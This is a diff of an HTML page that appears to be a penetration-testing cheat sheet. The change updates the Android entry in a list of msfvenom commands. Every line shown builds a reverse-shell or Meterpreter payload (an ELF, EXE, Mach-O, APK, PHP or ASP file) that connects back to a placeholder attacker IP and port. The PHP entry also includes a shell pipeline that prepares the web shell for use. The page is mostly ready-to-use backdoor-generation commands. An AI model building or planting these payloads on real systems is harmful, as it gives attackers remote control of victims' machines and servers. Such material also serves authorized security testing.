@@ -140,7 +140,7 @@
 <p>######Linux<br><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</code></p>
 <p>######Windows<br><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</code></p>
 <p>######Mac<br><code>msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</code></p>
-<p>######Android<br><code>msfpayload android/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; X &gt; android_backdoor.apk</code></p>
+<p>######Android<br><code>msfvenom -p android/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -o shell.apk</code></p>
 <p>######PHP<br><code>msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php
 cat shell.php | pbcopy &amp;&amp; echo &#39;&lt;?php &#39; | tr -d &#39;\n&#39; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</code></p>
 <p>######ASP<br><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</code></p>
